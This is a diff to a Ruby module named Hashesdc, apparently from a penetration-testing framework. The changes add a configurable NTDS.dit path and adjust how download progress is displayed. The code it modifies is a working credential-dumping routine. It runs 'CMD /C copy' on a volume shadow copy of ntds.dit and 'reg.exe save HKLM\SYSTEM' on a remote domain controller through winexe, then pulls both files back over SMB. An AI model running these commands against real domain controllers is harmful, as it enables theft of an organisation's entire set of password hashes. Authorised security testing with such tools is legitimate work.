@@ -78,7 +78,10 @@ class Hashesdc < Poet::Scanner
 		while true
 			print "Enter the Path to the NTDS.dit file #{color_banner('[\\Windows\\NTDS]')} : "
 			@ntds = rgets
-			if @ntds =~ /^\\/
+			if @ntds =~ /^\\$/
+				@ntds = ''
+				break
+			elsif @ntds =~ /^\\/
 				break
 			elsif @ntds.empty?
 				@ntds = "\\Windows\\NTDS"
@@ -116,7 +119,9 @@ class Hashesdc < Poet::Scanner
 
 				# Check if there is enough space on drive
 				print_status("Checking if space exists to copy files...")
-				space = winexe(smboptions, "CMD /C dir #{@ntds_drive}\\Windows\\NTDS\\ntds.dit")
+
+				space = winexe(smboptions, "CMD /C dir #{@ntds_drive}#{@ntds}\\ntds.dit")
+
 				free = /Dir\(s\)\s+([0-9,]+)\sbytes free/m.match(space)[1]
 				file_size = /File\(s\)\s+([0-9,]+)\s+bytes/m.match(space)[1]
 				file_size = file_size.gsub!(/,/, '')
@@ -135,7 +140,7 @@ class Hashesdc < Poet::Scanner
 					
 						# Copy files
 						print_status("Copying ntds.dit and sys...")
-						cmd = "CMD /C copy #{vss_volume_name}\\Windows\\NTDS\\ntds.dit #{@drive}#{@drop_path}\\ntds.dit && reg.exe save HKLM\\SYSTEM #{@drive}#{@drop_path}\\sys"
+						cmd = "CMD /C copy #{vss_volume_name}#{@ntds}\\ntds.dit #{@drive}#{@drop_path}\\ntds.dit && reg.exe save HKLM\\SYSTEM #{@drive}#{@drop_path}\\sys"
 						vss_copy = winexe(smboptions, cmd)
 
 						# If files are copied...
@@ -176,8 +181,6 @@ class Hashesdc < Poet::Scanner
 								print_warning("#{host.ljust(15)} - ntds.dit.export already exists, renamed existing one...")
 
 							end
-
-							copy_ntds = smbclient(clientoptions, "get #{@drop_path}\\ntds.dit #{local_drop}/#{ntds_filename}")
 
 							ntdsthread = Thread.new do
 								# Copy files to local sysstem
@@ -309,12 +312,15 @@ class Hashesdc < Poet::Scanner
 	# Print progress on download
 	def progress(size, file)
 		print '.'
-		sleep 2
+		sleep 1.5
 		print '.'
-		sleep 2
-		percent = size.to_f / (File.size? file).to_f 
+		sleep 1.5
+		print '.'
+		sleep 1.5
+		percent =  (File.size? file).to_f / size.to_f
 		percent = percent * 100
-		print "\e[1;37m#{percent}\e[0m% "
+		percent = ((percent*20).round / 20.0)
+		print "\e[1;37m#{percent}\e[0m%"
 	end
 
 	def finish
